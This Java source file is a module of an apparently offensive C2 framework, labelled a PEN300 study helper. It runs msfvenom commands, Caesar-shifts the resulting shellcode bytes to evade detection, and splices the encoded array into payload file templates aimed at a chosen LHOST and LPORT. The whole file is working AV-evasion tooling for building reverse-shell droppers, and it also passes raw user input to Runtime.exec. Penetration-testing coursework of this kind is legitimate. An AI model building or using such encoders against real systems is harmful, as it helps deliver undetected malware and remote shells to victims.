package c2.session.wizard;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.file.DirectoryStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import util.test.OutputStreamWriterHelper;

public class MsfShellcodeCaesarWizard implements Wizard {
	
	public static final String INVOKE_COMMAND="caesar_msf_helper";

	private List<String> shellTemplates = new ArrayList<String>();
	private List<Path> fileTemplates = new ArrayList<>();
	
	@Override
	public void init(Properties properties) throws WizardConfigurationException{
		int idx = 1;
		boolean process = true;
		while(process) {
			if(properties.containsKey("template.msf.command." + idx)) {
				shellTemplates.add(properties.getProperty("template.msf.command." + idx));
				idx++;
			}else {
				process = false;
			}
		}
		String pathStrFileTemplates = properties.getProperty("template.file.dir", "config" + FileSystems.getDefault().getSeparator() + "pen300_study_tools" + FileSystems.getDefault().getSeparator() + "msf_templates");
		Path folderPath = Paths.get(pathStrFileTemplates);
		try {
		try (DirectoryStream<Path> stream = Files.newDirectoryStream(folderPath)) {
	        for (Path path : stream) {
	            if (!Files.isDirectory(path)) {
	            	fileTemplates.add(path);
	            }
	        }
	    }
		}catch(IOException ex) {
			throw new WizardConfigurationException(ex.getMessage());
		}
	}

	@Override
	public String getHumanReadableName() {
		return "MSF Shellcode Caesar Helper";
	}

	@Override
	public String getInvocationName() {
		return INVOKE_COMMAND;
	}

	@Override
	public void surrenderControlFlow(OutputStreamWriter bw, BufferedReader br) throws IOException {
		String lhost=null;
		String lport=null;
		Integer caesar = null;
		boolean liveOn = true;
		boolean awaitingShellcodeInstr = true;
		boolean awaitingPayloadFile = true;
		String msfCommand = null;
		OutputStreamWriterHelper.writeAndSend(bw, getHelpMessage());
		while(liveOn) {
			String line = br.readLine();
			if(line.startsWith("set_lport")) {
				try {
					String candidateLport = line.split("=")[1];
					Integer.parseInt(candidateLport);
					lport = candidateLport;
				}catch(NumberFormatException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "set_lport must specify a number");
				}catch(ArrayIndexOutOfBoundsException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "Invalid format for set_lport");
				}
			}else if(line.startsWith("set_lhost")) {
				try {
					lhost = line.split("=")[1];
				}catch(ArrayIndexOutOfBoundsException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "Invalid format for set_lhost");
				}
			}else if(line.startsWith("set_caesar")) {
				try {
					String candidateCaesar = line.split("=")[1];
					caesar = Integer.parseInt(candidateCaesar);
				}catch(NumberFormatException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "set_caesar must specify a number");
				}catch(ArrayIndexOutOfBoundsException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "Invalid format for set_caesar");
				}
			}else {
				if(awaitingShellcodeInstr) {
					if(caesar == null) {
						OutputStreamWriterHelper.writeAndSend(bw, "Please set caesar before continuing");
						continue;
					}
					try {
						int chosenTemplateShell = Integer.parseInt(line);
						if(chosenTemplateShell > shellTemplates.size()) {
							OutputStreamWriterHelper.writeAndSend(bw, "Invalid choice for shellcode template");
							continue;
						}else if(lhost == null || lport == null) {
							OutputStreamWriterHelper.writeAndSend(bw, "Please set lhost and lport before continuing");
							continue;
						}
						msfCommand = shellTemplates.get(chosenTemplateShell);
						msfCommand = msfCommand.replace("$LHOST", lhost);
						msfCommand = msfCommand.replace("$LPORT", lport);
					}catch(NumberFormatException ex) {
						msfCommand = line;
					}
					try {
						//This instruction just sanity checks generation before the final compile
						generateCompilableCaesarEncodedTextFromMsf(msfCommand, caesar);
						awaitingShellcodeInstr = false;
						OutputStreamWriterHelper.writeAndSend(bw, "Please select from one of the following available file templates:");
						for(int i = 0; i < fileTemplates.size(); i++) {
							OutputStreamWriterHelper.writeAndSend(bw, "(" + i + ") " + fileTemplates.get(i));
						}
					} catch (MsfProcessingException e) {
						OutputStreamWriterHelper.writeAndSend(bw, "Cannot generate msf shellcode: " + line);
					}
				}else if(awaitingPayloadFile) {
					try {
						int chosenFileTemplate = Integer.parseInt(line);
						if(chosenFileTemplate > fileTemplates.size()) {
							OutputStreamWriterHelper.writeAndSend(bw, "Invalid choice for file template");
							continue;
						}
						Path fileTemplate = fileTemplates.get(chosenFileTemplate);
						try {
							String outputFile = generateCompleteReplacementFile(msfCommand, caesar, fileTemplate);
							OutputStreamWriterHelper.writeAndSend(bw, outputFile);
						} catch (MsfProcessingException e) {
							OutputStreamWriterHelper.writeAndSend(bw, "Unable to produce file: " + e.getMessage());
						}
						liveOn = false;
					}catch(NumberFormatException ex) {
						OutputStreamWriterHelper.writeAndSend(bw, "Pick a number to select file template");
					}
				}else {
					OutputStreamWriterHelper.writeAndSend(bw, "This wizard is trapped in a bad state, returning");
					liveOn = false;
				}
			}
		}

	}
	
	private String getHelpMessage() {
		StringBuilder sb = new StringBuilder();
		sb.append("PEN300 Helper Module: MSF Shellcode Caesar Encoder" + System.lineSeparator());
		sb.append("Enter a Caesar cipher factor with the command such as 'set_caesar=4'. A positive value of 4 will increment all bytes by 4" + System.lineSeparator());
		sb.append("Enter a number corresponding to one of the predefined MSF shellcodes commands below, or enter a custom MSF shellcode." + System.lineSeparator());
		sb.append("If using a predefined command, please first set LHOST and LPORT with the commands 'set_lport=127.0.0.1' and set 'set_lport=8080'" + System.lineSeparator());
		for(int i = 0; i < shellTemplates.size(); i++) {
			sb.append("(" + i + ") " + shellTemplates.get(i) + System.lineSeparator());
		}
		sb.append("Finally, selected from one of the available payload files" + System.lineSeparator());
		for(int i = 0; i < fileTemplates.size(); i++) {
			sb.append("(" + i + ") " + fileTemplates.get(i) + System.lineSeparator());
		}
		return sb.toString();
	}
	
	protected static String generateCompleteReplacementFile(String msfCommand, int caesarFactor, Path targetFile) throws MsfProcessingException{
		String caesarStrArray = generateCompilableCaesarEncodedTextFromMsf(msfCommand, caesarFactor);
		try {
			String file = Files.readString(targetFile);
			return file.replace("CAESAR_ARRAY_HERE", caesarStrArray);
		} catch (IOException e) {
			e.printStackTrace();
			throw new MsfProcessingException("Cannot parse target file: " + targetFile.toString());
		}
	}

	protected static String generateCompilableCaesarEncodedTextFromMsf(String msfCommand, int caesarFactor)
			throws MsfProcessingException {
		try {
			Process p = Runtime.getRuntime().exec(msfCommand);
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line;
			StringBuilder output = new StringBuilder();
			while ((line = input.readLine()) != null) {
				output.append(line + System.lineSeparator());
			}
			List<Short> caesarBytes = processMsfVenom(output.toString(), caesarFactor);
			return shortListToStringByteArray(caesarBytes);
		} catch (IOException ex) {
			throw new MsfProcessingException("Could not invoke MSF venom command: " + ex.getMessage());
		}
	}

	protected static String shortListToStringByteArray(List<Short> caesarBytes) {
		StringBuilder sb = new StringBuilder();
		sb.append("new byte[" + caesarBytes.size() + "] = {");
		boolean firstByte = true;
		for (Short s : caesarBytes) {
			if (!firstByte) {
				sb.append(", ");
			} else {
				firstByte = false;
			}
			sb.append(String.format("0x%02X", s));
		}
		sb.append("};");
		return sb.toString();
	}

	protected static List<Short> processMsfVenom(String output, int caesarFactor) throws MsfProcessingException {
		List<Short> bytes = new ArrayList<Short>();

		String[] lines = output.split(System.lineSeparator());
		boolean insideArray = false;
		for (String line : lines) {
			if (line.startsWith("byte[] buf")) {
				insideArray = true;
				line = line.substring(line.indexOf('{') + 1);
			}
			if (insideArray) {
				line = line.replace("}", "").replace(";", "");
				String byteStrs[] = line.split(",");
				for (String bS : byteStrs) {
					try {
						Short current = Short.parseShort(bS.substring(2), 16);
						Short modified = (short) ((current + caesarFactor) & 0xFF);
						bytes.add(modified);
					} catch (NumberFormatException ex) {
						ex.printStackTrace();
						throw new MsfProcessingException("Cannot parse value from MSF");
					}
				}
			}
		}

		return bytes;
	}

	static class MsfProcessingException extends Exception {

		private static final long serialVersionUID = 1L;

		public MsfProcessingException(String msg) {
			super(msg);
		}

	}
}
